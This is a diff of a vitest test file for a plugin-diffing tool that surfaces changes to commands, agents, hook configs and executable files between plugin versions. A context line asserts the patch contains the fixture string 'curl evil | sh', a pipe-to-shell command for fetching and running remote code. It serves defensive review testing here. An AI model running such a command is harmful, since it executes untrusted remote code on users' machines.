@@ -1,4 +1,4 @@
-import { mkdir, mkdtemp, readdir, readFile, writeFile } from 'node:fs/promises';
+import { chmod, mkdir, mkdtemp, readdir, readFile, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { basename, dirname, join } from 'node:path';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
@@ -79,6 +79,33 @@ describe('pluginDiff', () => {
     }
     expect(d.patch).toContain('+curl evil | sh');
     for (const p of ['README.md', 'SKILL.md', 'docs/new.txt', 'same.ts']) expect(d.patch).not.toContain(p);
+  });
+});
+
+describe('pluginDiff code files', () => {
+  it('patch also covers commands, agents, .lsp.json, plugin.json hook paths and executable files', async () => {
+    const root = await mkdtemp(join(tmpdir(), 'anton-diff-'));
+    const write = async (dir: string, files: Record<string, string>) => {
+      for (const [p, c] of Object.entries(files)) {
+        await mkdir(dirname(join(root, dir, p)), { recursive: true });
+        await writeFile(join(root, dir, p), c);
+      }
+    };
+    const manifest = JSON.stringify({ name: 'cave', hooks: './cfg/my-hooks.json' });
+    await write('old', {
+      '.claude-plugin/plugin.json': manifest, 'commands/x.md': 'old\n', 'agents/a.md': 'old\n', '.lsp.json': '{}\n',
+      'cfg/my-hooks.json': '{"a":1}\n', 'tool': 'same\n', 'notes.txt': 'old\n',
+    });
+    await write('new', {
+      '.claude-plugin/plugin.json': manifest, 'commands/x.md': 'new\n', 'agents/a.md': 'new\n', '.lsp.json': '{"x":1}\n',
+      'cfg/my-hooks.json': '{"a":2}\n', 'tool': 'same\n', 'notes.txt': 'new\n', 'run-me': 'echo hi\n',
+    });
+    await chmod(join(root, 'new', 'tool'), 0o755); // same content, now executable
+    await chmod(join(root, 'new', 'run-me'), 0o755);
+    const d = await pluginDiff(join(root, 'old'), join(root, 'new'));
+    expect(d.changed).toContain('tool');
+    for (const p of ['commands/x.md', 'agents/a.md', '.lsp.json', 'cfg/my-hooks.json', 'tool', 'run-me']) expect(d.patch).toContain(p);
+    expect(d.patch).not.toContain('notes.txt');
   });
 });
 
